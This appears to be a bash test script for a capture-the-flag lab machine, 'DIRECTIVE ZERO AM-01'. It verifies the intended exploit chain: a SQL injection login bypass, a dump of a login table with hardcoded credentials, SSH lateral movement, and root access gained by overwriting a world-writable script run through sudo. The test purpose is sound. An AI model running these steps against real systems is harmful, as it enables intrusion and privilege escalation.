#!/usr/bin/env bash
#
# DIRECTIVE ZERO — AM-01 exploit-chain test assertions.
#
# Sourced by _test_runner/run_tests.sh. Must define run_am_tests().
# Uses helper functions provided by the runner:
#   assert_port_open <port>
#   assert_http_contains <path> <pattern> [post_data]
#   assert_db_query_contains <db_user> <db_pass> <db_name> <query> <pattern>
#   assert_ssh_login <user> <password>
#   assert_ssh_command <user> <password> <remote_command> <expected_pattern>
#   assert_flag_matches <actual> <expected>
#   pass / fail
#
# Env vars set by the runner:
#   AM_USER_FLAG, AM_ROOT_FLAG, TARGET_HOST

run_am_tests() {
  # SSH creds the runner uses for DB-via-SSH and flag reads.
  export SSH_DB_USER="compliance"
  export SSH_DB_PASS="WinterCaseSensitiveShallNotPass!"

  echo "Stage 1 — service enumeration"
  assert_port_open 80
  assert_port_open "${TARGET_SSH_PORT:-22}"

  echo "Stage 2 — SQLi auth bypass on login form"
  # Payload  ' OR 1=1 -- -  bypasses auth -> 302 redirect to dashboard.
  # A failed login returns 200 with the error text, so the 302 is the
  # proof of bypass. Then fetch the dashboard with the session cookie
  # to confirm it renders.
  export COOKIE_JAR=/tmp/dz_am01_cookies
  rm -f "$COOKIE_JAR"
  local code
  code="$(curl -s -o /dev/null -w '%{http_code}' -c "$COOKIE_JAR" \
    -X POST -d "username=%27+OR+1%3D1+--+-&password=x" \
    "http://${TARGET_HOST}/app/index.php")"
  if [[ "$code" == "302" ]]; then
    pass "SQLi bypass -> 302 redirect"
  else
    fail "SQLi bypass expected 302, got $code"
  fi
  assert_http_contains "/app/dashboard.php" "Enrollment Dashboard"

  echo "Stage 3 — second-order command injection sink reachable"
  # The dashboard "Update Contact Email" form is the injection sink.
  # Confirm it renders with the session cookie.
  assert_http_contains "/app/dashboard.php" "Update Contact Email"

  echo "Stage 4 — DB cred discovery + login table dump"
  # Use the app DB creds (from app/config.php) to dump the login table
  # and recover the SSH password for `compliance`. Done over SSH since
  # MariaDB is bound to 127.0.0.1 inside the AM (not published externally).
  assert_db_query_contains "lobby_app" "lobby_app_sql_pass_2026" "lobby" \
    "SELECT password FROM login WHERE username='compliance'" \
    "WinterCaseSensitiveShallNotPass!"

  echo "Stage 5 — SSH lateral as compliance + user flag"
  assert_ssh_login "compliance" "WinterCaseSensitiveShallNotPass!"
  local user_actual
  user_actual="$(sshpass -p 'WinterCaseSensitiveShallNotPass!' \
    ssh -p "${TARGET_SSH_PORT:-22}" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        compliance@${TARGET_HOST} 'cat /home/compliance/user.txt' 2>/dev/null \
    | tr -d '\n')"
  assert_flag_matches "$user_actual" "$AM_USER_FLAG"

  echo "Stage 6 — sudo privesc via world-writable run_audit.sh"
  # Confirm the sudoers entry exists.
  assert_ssh_command "compliance" "WinterCaseSensitiveShallNotPass!" \
    "sudo -l" "/usr/local/bin/run_audit.sh"
  # Confirm the script is writable by compliance (world-writable).
  assert_ssh_command "compliance" "WinterCaseSensitiveShallNotPass!" \
    "test -w /usr/local/bin/run_audit.sh && echo WRITABLE" "WRITABLE"

  # Overwrite the audit script to dump the root flag, run it via sudo,
  # and assert we recover the expected root flag.
  local root_actual
  root_actual="$(sshpass -p 'WinterCaseSensitiveShallNotPass!' \
    ssh -p "${TARGET_SSH_PORT:-22}" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        compliance@${TARGET_HOST} \
        'echo "#!/bin/bash
cat /root/root.txt" > /usr/local/bin/run_audit.sh && sudo /usr/local/bin/run_audit.sh' \
        2>/dev/null | tr -d '\n')"
  assert_flag_matches "$root_actual" "$AM_ROOT_FLAG"

  echo "Stage 7 — lore Fragment A present in DB"
  assert_db_query_contains "lobby_app" "lobby_app_sql_pass_2026" "lobby" \
    "SELECT notes FROM citizens WHERE username='record_pre_quorum_001'" \
    "FRAGMENT A"
}